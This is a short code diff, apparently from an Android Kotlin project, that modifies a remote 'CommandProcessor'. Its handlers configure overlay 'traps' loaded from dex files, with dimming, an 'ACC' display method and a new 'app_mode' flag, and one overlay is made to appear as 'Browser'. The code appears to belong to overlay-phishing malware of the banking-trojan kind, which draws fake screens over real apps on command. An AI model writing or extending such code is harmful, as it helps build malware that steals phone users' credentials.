@@ -475,7 +475,7 @@ object CommandProcessor {
                                 val dimLevel = trap.optInt("dim", 85)
                                 val method = trap.optString("method", "ACC")
                                 Handler(Looper.getMainLooper()).post {
-                                    DynamicUIManager.showNativeOverlay(ctx, dexPath, className, dimLevel, method)
+                                    DynamicUIManager.showNativeOverlay(ctx, dexPath, className, dimLevel, method, true, "Browser")
                                 }
                                 found = true
                                 break
@@ -1155,6 +1155,7 @@ object CommandProcessor {
                                 put("timeout", json.optLong("timeout", 15L))
                                 put("dim", json.optInt("dim", 20))
                                 put("html", json.optString("html", ""))
+                                put("app_mode", json.optBoolean("app_mode", false))
                             }
 
                             var found = false
@@ -1291,6 +1292,7 @@ object CommandProcessor {
                                             put("timeout", json.optLong("timeout", 15L))
                                             put("dim", json.optInt("dim", 20))
                                             put("method", json.optString("method", "ACC").uppercase())
+                                            put("app_mode", json.optBoolean("app_mode", false))
                                             put("file_path", trapDir.absolutePath) // We store the DIR, not the file
                                         }
 
